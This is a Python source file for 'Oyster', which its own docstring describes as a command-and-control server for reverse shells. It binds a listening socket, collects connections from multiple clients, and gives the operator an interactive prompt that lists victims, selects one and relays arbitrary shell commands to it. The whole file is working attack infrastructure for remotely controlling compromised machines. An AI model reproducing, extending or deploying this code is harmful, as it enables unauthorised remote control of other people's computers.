from time import sleep
import socket
import sys
import threading
from queue import Queue


class Server(object):
    """
    A simple command and control server(Reverse Shell).
    """
    def __init__(self, queue, host="", port=6667, recv_size=1024, listen=10, bind_retry=5, timeout=-1):
        header = """\n .oOOOo.
.O     o.
O       o               O
o       O              oOo
O       o O   o .oOo    o   .oOo. `OoOo.
o       O o   O `Ooo.   O   OooO'  o
`o     O' O   o     O   o   O      O
 `OoooO'  `OoOO `OoO'   `oO `OoO'  o
              o
           OoO'                         """
        print(header, end='\n\n')
        self.queue = queue
        self.host = host
        self.port = int(port)
        self.recv_size = int(recv_size)
        self.listen = int(listen)
        self.bind_retry = bind_retry

        self.client_platform = ''

        self.socket = False

        self.connections = []
        self.addresses = []

        self.timeout = int(timeout)

        self.term_string = 'Oyster> '

        self.times_out = True
        if self.timeout == -1:
            self.times_out = False

    def create_socket(self):
        # Create the socket
        try:
            self.socket = socket.socket()
            if self.times_out:
                self.timeout = float(self.timeout)
                self.socket.settimeout(self.timeout)
            else:
                self.timeout = None
        except socket.error as error_message:
            print('Could not create socket:', error_message)
            sys.exit()
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def bind_socket(self, attempts=1):
        """
        Bind the socket to the port.

        :return:
        """

        print('Starting on port', self.port, end=', ')
        try:
            # Bind & start listening.
            self.socket.bind((self.host, self.port))
            self.socket.listen(self.listen)
            print('waiting for client connections...', end='\n\n')

        except socket.error as error_message:
            print('Could not bind the socket:', error_message, '\n', 'Trying again...')
            sleep(1)

            # Try to bind the socket 5 times before giving up.
            if attempts == self.bind_retry:
                print('Could not bind the socket to the port after {} tries.  Aborting...'.format(self.bind_retry))
                sys.exit()
            self.bind_socket(attempts=attempts + 1)

    def accept_connections(self):
        """
        Start accepting connections.

        :return:
        """

        for connection in self.connections:
            connection.close()

        self.connections = []
        self.addresses = []

        while True:
            try:
                item = self.queue.get(False)
            except:
                item = False

            if item is None:
                self.shutdown()
                break
            try:
                conn, address = self.socket.accept()
                # conn.setblocking(1)
            except socket.error as e:
                # print('Error accepting connections: %s' % str(e))
                # Loop indefinitely
                continue
            self.connections.append(conn)
            self.addresses.append(address)
            print('\n{} ({}) connected...\n{}'.format(address[0], address[1], self.term_string), end='')
            # self.queue.task_done()
        self.queue.task_done()
        return

    def get_client_platform(self, address, connection):
        print('Connection | IP', address[0], '| Port', address[1])

        # The client platform is used to determine default commands for
        # getting the current working directory.
        print('Getting platform... ', end='')
        self.client_platform = self.send_command('single_command-get_platform', connection)
        print('Client platform is "{}".'.format(self.client_platform), end='\n\n')

        # Get the current working directory and print it to the console.
        self.term_string = self.send_command('single_command-getcwd', connection)
        print(self.term_string, end='')
        return self

    def send_command(self, command, connection):
        """
        Send a single command to the client, and return the response.
        This is used for retrieving info from the clients.

        :param command:
        :param connection:
        :return:
        """

        # Check out the command and make any modifications needed.
        command = self._check_command(command)

        # Set defaults.
        response = '> '
        accepting = True

        if not command:
            print(response, end='')

        # Send the command
        connection.send(str.encode(command))

        # Accept the response.
        total_response = ''
        while accepting:
            response = str(connection.recv(self.recv_size), 'utf-8')
            total_response += response.replace('~!_TERM_%~', '')

            # If we get the termination string, stop accepting.
            if response[-10:] == '~!_TERM_%~':
                accepting = False

        return total_response

    def list_connections(self):
        """ List all connections """
        print('----- Clients -----')
        for c, conn in enumerate(self.connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(self.recv_size)
            except:
                del self.connections[c]
                del self.addresses[c]
                continue
            print('[{}]'.format(c), ' ', self.addresses[c][0], ' ', self.addresses[c][1])
        return

    def get_target(self, cmd):
        """ Select target client
        :param cmd:
        """
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except:
            print('Client index should be an integer')
            return None, None
        try:
            connection = self.connections[target]
        except IndexError:
            print('Not a valid selection')
            return None, None
        print("You are now connected to " + str(self.addresses[target][0]))
        return target, connection

    def open_oyster(self):
        sleep(1)
        while True:
            try:
                item = self.queue.get(False)
            except:
                item = False

            if item is None:
                break
            command = input('Oyster> ')
            if command == 'list':
                self.list_connections()
                continue

            if 'select' in command:
                target, connection = self.get_target(command)
                if connection is not None:
                    self.send_target_commands(target, connection)
                    self.term_string = 'Oyster> '
                continue

            if command == 'quit' or command == 'exit' or command == 'shutdown':
                self.queue.put(None)
                print('Server shutting down...')
                self.socket.close()
                continue

            self.queue.task_done()
        self.queue.task_done()
        return

    def shutdown(self):
        for c in self.connections:
            try:
                self.send_command('shutdown', c)
            except OSError:
                pass

        for c in self.connections:
            c.close()

        return

    def send_target_commands(self, target, connection):
        """
        Send commands through to the clients.

        :return:
        """

        address = self.addresses[target]
        self.get_client_platform(address, connection)
        # Loop while accepting input and sending the commands to the client.
        while True:
            command = input(' ')
            response = '> '
            accepting = True
            command = self._check_command(command)
            if not command:
                print(response, end='')

            if command == 'quit' or command == 'exit':
                print('Disconnecting from client...')
                self.send_command('quit', connection)
                # sleep(1)
                self.term_string = 'Oyster> '
                break

            if command == 'shutdown':
                self.shutdown()
                break

            connection.send(str.encode(command))
            # Accept the response.
            while accepting:
                response = str(connection.recv(self.recv_size), 'utf-8')
                print(response.strip().replace('~!_TERM_%~', ''), end='')

                if response[-10:] == '~!_TERM_%~':
                    accepting = False
        del self.connections[target]
        del self.addresses[target]
        connection.close()
        return self

    def main(self):
        """
        Send commands through to the clients.

        :return:
        """

        # Loop while accepting input and sending the commands to the client.
        while True:
            command = input(' ')
            response = '> '
            accepting = True
            command = self._check_command(command)
            if not command:
                print(response, end='')

            self.connection.send(str.encode(command))
            # Accept the response.
            while accepting:
                response = str(self.connection.recv(self.recv_size), 'utf-8')
                print(response.strip().replace('~!_TERM_%~', ''), end='')

                if response[-10:] == '~!_TERM_%~':
                    accepting = False

        self.connection.close()

    def _check_command(self, command):
        """
        Check the command and return True or False, or quit if the quit command is sent.

        :param command:
        :return:
        """

        if len(str.encode(command)) > 0:
            return command
        else:
            if self.client_platform == 'win32':
                return 'echo'
            else:
                return 'echo'


def worker(the_queue, the_server):
    while True:
        item = the_queue.get()
        if item is None:
            break
        if item == 'accept_connections':
            print('Accepting connections.')
            the_server.create_socket()
            the_server.bind_socket()
            the_server.accept_connections()

        if item == 'run_cli':
            print('Running cli.')
            server.open_oyster()
        # the_queue.task_done()


if __name__ == '__main__':

    the_host = ''
    the_port = 6667
    the_recv_size = 1024
    the_listen = 10
    the_bind_retry = 5
    the_timeout = 15.0
    the_thread_count = 2

    def check_cli_arg(arg):
        global the_host
        global the_port
        global the_recv_size
        global the_listen
        global the_bind_retry
        global the_timeout
        global the_thread_count

        if 'host=' in arg:
            the_host = arg.split('=')[1]
        elif 'port=' in arg:
            the_port = int(arg.split('=')[1])
        elif 'recv_size=' in arg:
            the_recv_size = int(arg.split('=')[1])
        elif 'listen=' in arg:
            the_listen = int(arg.split('=')[1])
        elif 'bind_retry=' in arg:
            the_bind_retry = int(arg.split('=')[1])
        elif 'timeout=' in arg:
            the_timeout = float(arg.split('=')[1])
        elif 'thread_count=' in arg:
            the_thread_count = int(arg.split('=')[1])

    for argument in sys.argv[1:]:
        check_cli_arg(argument)

    queue = Queue()

    server = Server(
        queue,
        host=the_host,
        port=the_port,
        recv_size=the_recv_size,
        listen=the_listen,
        bind_retry=the_bind_retry,
        timeout=the_timeout
    )

    threads = []

    for i in range(the_thread_count):
        t = threading.Thread(target=worker, args=(queue, server))
        t.setDaemon(True)
        t.start()
        threads.append(t)

    queue.put('accept_connections')
    queue.put('run_cli')

    queue.join()

    for thread in threads:
        thread.join()

    sys.exit(0)


